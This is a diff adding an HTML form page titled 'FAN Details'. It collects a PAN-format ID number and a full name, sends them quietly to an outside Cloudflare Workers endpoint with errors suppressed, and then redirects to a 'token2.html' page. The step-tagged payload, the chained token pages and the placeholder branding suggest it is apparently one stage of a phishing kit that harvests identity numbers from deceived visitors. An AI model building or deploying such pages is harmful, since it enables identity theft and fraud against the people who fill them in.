@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><title>FAN Details</title><style>/* copy from index */</style></head>
+<body>
+<div class="header"><img src="https://via.placeholder.com/180x50/003087/fff?text=Your+Business" alt="Logo"></div>
+<div class="container">
+  <h2 style="text-align:center;color:#003087;">FAN Details</h2>
+  <form id="frm">
+    <input type="text" id="f" placeholder="FAN Number" pattern="[A-Za-z]{5}[0-9]{4}[A-Za-z]{1}" maxlength="10" required>
+    <input type="text" id="n" placeholder="Full Name" required>
+    <button type="submit">Submit</button>
+  </form>
+</div>
+<script>
+document.getElementById("frm").addEventListener("submit", async e => {
+  e.preventDefault();
+  const payload = {
+    step: "fan",
+    fan: document.getElementById("f").value.toUpperCase(),
+    name: document.getElementById("n").value,
+    time: new Date().toISOString()
+  };
+  await fetch("https://form-save-backend.youraccount.workers.dev/save", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)}).catch(()=>{});
+  location.href = "token2.html";
+});
+</script>
+</body>
+</html>
